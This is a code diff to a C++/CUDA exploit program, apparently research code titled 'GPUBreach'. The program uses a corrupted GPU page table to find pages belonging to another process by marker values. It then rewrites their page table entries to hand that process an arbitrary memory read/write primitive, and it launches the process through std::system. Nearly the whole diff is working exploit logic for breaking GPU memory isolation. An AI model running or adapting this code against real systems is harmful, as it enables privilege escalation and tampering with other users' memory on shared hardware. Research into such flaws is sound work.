@@ -5,6 +5,8 @@
 #include <fcntl.h>
 #include <filesystem>
 #include <unistd.h>
+#include <chrono>
+#include <thread>
 
 static void
 removeFirstArg (int &argc, char *argv[])
@@ -23,7 +25,7 @@ main (int argc, char *argv[])
     std::cout << "Not enough arguments.\n";
     return 0;
   }
-
+  std::string transfer_app_cmd = argv[argc-1];
   removeFirstArg (argc, argv);
   GPUBreachContext ctx = second_PT_region (argc, argv);
 
@@ -58,7 +60,7 @@ main (int argc, char *argv[])
   void* pt_rw_orig_ptr = nullptr;
 
   const uint64_t null_pte =(uint64_t)(0x0600000000000001);
-  const uint64_t mask_2MB_pte =        0xFF000000000FFFFULL;
+  const uint64_t mask_2MB_pte =       0xFF000000000FFFFULL;
   cudaMemcpyArray(data_device_ptr, corrupted_ptr, 64L * 1024);
 
   for (uint64_t z = 0; z < 64L * 1024; z+=16)
@@ -164,14 +166,15 @@ main (int argc, char *argv[])
   cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
   DBG_OUT << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
 
-  std::cout << "(Stable Primitive Ready) Start mem_operator now. It should load its page with 0x6464646464646464. Press "
-                "\033[1;32mEnter Key\033[0m to start finding and modifing that page's PTE."
+  std::cout << "(Stable Primitive Ready) Starting your app now. It should load the page for doing arbitrary RW with 0x6464646464646464,"
+              "and its page for modifing the arbitrary RW location with 0x4646464646464646."
               << '\n';
-  paused();
+  std::system(transfer_app_cmd.c_str());
+  std::this_thread::sleep_for(std::chrono::seconds(2));
   std::cout << "Running" << '\n';
   
   it_ptr = (uint64_t)(0x600000000000001);
-  void* target = 0;
+  uint64_t transfer_arb_phys = 0, transfer_mod_phys = 0;
   for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
     {
       if (i > (uint64_t)0L * 1024 * 1024 * 1024)
@@ -184,13 +187,20 @@ main (int argc, char *argv[])
 
         cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 2L * 1024 * 1024);
         DBG_OUT << i << ' '<< (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
-        bool ispage = true;
         if (*(void**)(data_device_ptr) == (void*)0x6464646464646464)
         {
-          target = (void*)it_ptr;
-            std::cout << "Found your page in " << (void*) it_ptr << ", Value: "<< (void*)0x6464646464646464 << '\n';
-            std::cout << "Now scanning memory to find its PTE" << '\n';
-            break;
+          transfer_arb_phys = it_ptr;
+          std::cout << "Found your page in " << (void*) it_ptr << ", Value: "<< (void*)0x6464646464646464 << '\n';
+        }
+        if (*(void**)(data_device_ptr) == (void*)0x4646464646464646)
+        {
+          transfer_mod_phys = it_ptr;
+          std::cout << "Found modifier page in " << (void*) it_ptr << ", Value: "<< (void*)0x4646464646464646 << '\n';
+        }
+        if (transfer_mod_phys != 0 && transfer_arb_phys != 0)
+        {
+          std::cout << "Found both, looking for their PTEs...\n";
+          break;
         }
 
         cudaDeviceSynchronize();
@@ -199,11 +209,11 @@ main (int argc, char *argv[])
       it_ptr += 0x20000;
     }
 
-  DBG_OUT << (void*)target << '\n';
+  DBG_OUT << (void*)transfer_mod_phys << ' ' << (void*)transfer_arb_phys <<'\n';
   if (debug_enabled())
     paused();
-  uint64_t other_ofs = 0;
-  uint64_t other_phys = 0;
+  uint64_t transfer_mod_pt_ofs = 0, transfer_arb_pt_ofs = 0;
+  uint64_t transfer_mod_pt_phys = 0, transfer_arb_pt_phys = 0;
   it_ptr = (uint64_t)(0x0600000000000001);
   uint64_t mask =     0x00FFFFFFFFFFFF00ULL;
   for (uint64_t i = 0; i < (uint64_t)46L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
@@ -220,16 +230,24 @@ main (int argc, char *argv[])
         DBG_OUT << i << ' ' << (void*)it_ptr << ' ' << *(void**)data_device_ptr << '\n';
         for (uint64_t z = 0; z < 2L * 1024 * 1024; z+=8)
         {
-          if ((((*(uint64_t *)(data_device_ptr + z)) & mask) == ((uint64_t)target & mask)))
+          if ((((*(uint64_t *)(data_device_ptr + z)) & mask) == ((uint64_t)transfer_arb_phys & mask)))
           {
-            other_ofs = z;
-            other_phys = it_ptr;
-            DBG_OUT << "Found" << '\n';
-            break;
+            transfer_arb_pt_ofs = z;
+            transfer_arb_pt_phys = it_ptr;
+            std::cout << "Found arb PTE in " << (void*) transfer_arb_pt_phys << ", at ofs: " <<  (void*) transfer_arb_pt_ofs <<  '\n';
+          }
+          if ((((*(uint64_t *)(data_device_ptr + z)) & mask) == ((uint64_t)transfer_mod_phys & mask)))
+          {
+            transfer_mod_pt_ofs = z;
+            transfer_mod_pt_phys = it_ptr;
+            std::cout << "Found mod PTE in " << (void*) transfer_mod_pt_phys << ", at ofs: " <<  (void*) transfer_mod_pt_ofs <<  '\n';
           }
         }
-        if (other_phys != 0)
+        if (transfer_mod_pt_phys != 0 && transfer_arb_pt_phys != 0)
+        {
+          std::cout << "Found both, modifing them to their appropriate values...\n";
           break;
+        }
 
         cudaDeviceSynchronize();
         gpuErrchk(cudaPeekAtLastError());   
@@ -237,22 +255,35 @@ main (int argc, char *argv[])
       it_ptr += 0x20000;
     }
 
-  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + other_ofs, (uint64_t)0x060000000fff0005, 8);
+  // Move arbitrary rw to mod's PT physical location
+  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, transfer_mod_pt_phys, 8);
   cudaDeviceSynchronize();
   gen_64KB(flush_ptr, flush_size);
   simple_flush<<<1,1>>>(flush_ptr, flush_size);
   cudaDeviceSynchronize();
-  std::cout << "Found its PTE, modified your pointer's PTE to point to: "<< (void*) 0x060000000fff0005 << '\n';
-  std::cout << "Press \033[1;32mEnter Key\033[0m if you want to write " <<(void*)0x060000000ffe0005 << "instead." << '\n';
 
-  paused();
-
-  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + other_ofs, (uint64_t)0x060000000ffe0005, 8);
+  // Set mod's PTE to point to arb's PT location
+  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + transfer_mod_pt_ofs, transfer_arb_pt_phys, 8);
   cudaDeviceSynchronize();
   gen_64KB(flush_ptr, flush_size);
   simple_flush<<<1,1>>>(flush_ptr, flush_size);
   cudaDeviceSynchronize();
-  std::cout << "Found its PTE, modified your pointer's PTE to point to: "<< (void*) 0x060000000ffe0005 << '\n';
+
+  // Move arbitrary rw to arb's PT physical location
+  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + target_pte_ofs, transfer_arb_pt_phys, 8);
+  cudaDeviceSynchronize();
+  gen_64KB(flush_ptr, flush_size);
+  simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+
+  // Modify arb's PTE at offset to PTE null, for the application to know the offset
+  memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + transfer_arb_pt_ofs, (uint64_t)0x0600000000000001, 8);
+  cudaDeviceSynchronize();
+  gen_64KB(flush_ptr, flush_size);
+  simple_flush<<<1,1>>>(flush_ptr, flush_size);
+  cudaDeviceSynchronize();
+
+  std::cout << "Done. The application is currently running. Check the 'app.out' file in the respective 'data_scripts/' folder for progress if needed.\n";
 
   return 0;
 }
